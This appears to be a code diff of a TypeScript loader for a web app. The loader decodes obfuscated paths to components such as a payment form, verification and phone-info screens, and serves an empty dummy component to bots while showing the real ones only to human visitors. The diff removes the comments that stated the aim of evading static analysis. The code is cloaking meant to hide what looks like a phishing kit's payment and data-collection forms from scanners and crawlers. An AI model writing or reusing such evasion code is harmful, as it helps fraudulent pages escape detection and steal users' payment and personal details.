@@ -1,13 +1,7 @@
-/**
- * Dynamic Component Loader - Educational Purposes Only
- * Loads sensitive components at runtime to avoid static analysis
- */
 
 import { _l, _e, _d } from './secure-utils'
 
-// Component registry (obfuscated)
 const _cr = {
-  // Encrypted component paths
   p1: _e('pay-form'),
   p2: _e('veri'),
   p3: _e('confi'),
@@ -15,14 +9,12 @@ const _cr = {
   p5: _e('phone-info')
 }
 
-// Dynamic component loader
 export async function loadComponent(componentId: keyof typeof _cr): Promise<any> {
   _l(`Loading component: ${componentId}`)
   
   const componentPath = _d(_cr[componentId])
   
   try {
-    // Dynamic import with obfuscated path
     const loadedModule = await import(`@/components/${componentPath}`)
     _l(`Component loaded: ${componentPath}`)
     return loadedModule.default
@@ -32,7 +24,6 @@ export async function loadComponent(componentId: keyof typeof _cr): Promise<any>
   }
 }
 
-// Lazy load with delay (anti-bot)
 export async function lazyLoad(componentId: keyof typeof _cr, delay: number = 100): Promise<any> {
   return new Promise((resolve, reject) => {
     setTimeout(async () => {
@@ -46,7 +37,6 @@ export async function lazyLoad(componentId: keyof typeof _cr, delay: number = 10
   })
 }
 
-// Check if user is bot
 function isBot(): boolean {
   const userAgent = navigator.userAgent.toLowerCase()
   const botPatterns = [
@@ -57,25 +47,21 @@ function isBot(): boolean {
   return botPatterns.some(pattern => userAgent.includes(pattern))
 }
 
-// Load component only for real users
 export async function loadForUser(componentId: keyof typeof _cr): Promise<any> {
   if (isBot()) {
     _l('Bot detected, blocking component load')
-    // Return dummy component for bots
     return () => null
   }
   
   return await loadComponent(componentId)
 }
 
-// Preload components in background
 export function preloadComponents(componentIds: Array<keyof typeof _cr>): void {
   if (isBot()) {
     _l('Bot detected, skipping preload')
     return
   }
   
-  // Preload after user interaction
   if (typeof window !== 'undefined') {
     const preload = () => {
       componentIds.forEach(id => {
@@ -84,7 +70,6 @@ export function preloadComponents(componentIds: Array<keyof typeof _cr>): void {
         })
       })
       
-      // Remove listener after first interaction
       window.removeEventListener('mousemove', preload)
       window.removeEventListener('touchstart', preload)
     }
@@ -94,7 +79,6 @@ export function preloadComponents(componentIds: Array<keyof typeof _cr>): void {
   }
 }
 
-// Code splitting helper
 export function splitCode<T>(
   loader: () => Promise<T>,
   fallback?: T
